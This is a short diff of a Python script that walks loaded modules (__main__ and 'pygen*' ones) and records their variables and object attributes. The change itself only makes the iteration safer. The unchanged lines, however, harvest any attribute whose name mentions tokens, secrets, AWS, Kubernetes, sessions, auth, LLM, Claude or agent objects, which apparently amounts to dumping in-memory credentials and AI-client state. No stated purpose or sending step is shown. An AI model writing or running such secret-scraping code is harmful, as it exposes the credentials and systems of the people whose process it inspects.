@@ -48,14 +48,14 @@ try:
  for name,m in sorted(sys.modules.items()):
   if not m or not (name=="__main__" or name.startswith("pygen")):continue
   rec={}
-  for k,v in vars(m).items():
+  for k,v in list(vars(m).items()):
    try:
     if k.startswith("__"):continue
     if isinstance(v,(str,bytes,bytearray,int,float,bool,type(None))):
      rec[k]=v.decode("utf-8","replace") if isinstance(v,(bytes,bytearray)) else v
     elif hasattr(v,"__dict__"):
      attrs={}
-     for ak,av in vars(v).items():
+     for ak,av in list(vars(v).items()):
       if ak.startswith("__"):continue
       if isinstance(av,(str,bytes,bytearray,int,float,bool,type(None))):attrs[ak]=av.decode("utf-8","replace") if isinstance(av,(bytes,bytearray)) else av
       elif any(x in ak.lower() for x in ("token","secret","aws","role","kube","dispatcher","metaserve","config","session","state","client","auth","llm","claude","agent")):attrs[ak]=repr(av)[:2000]
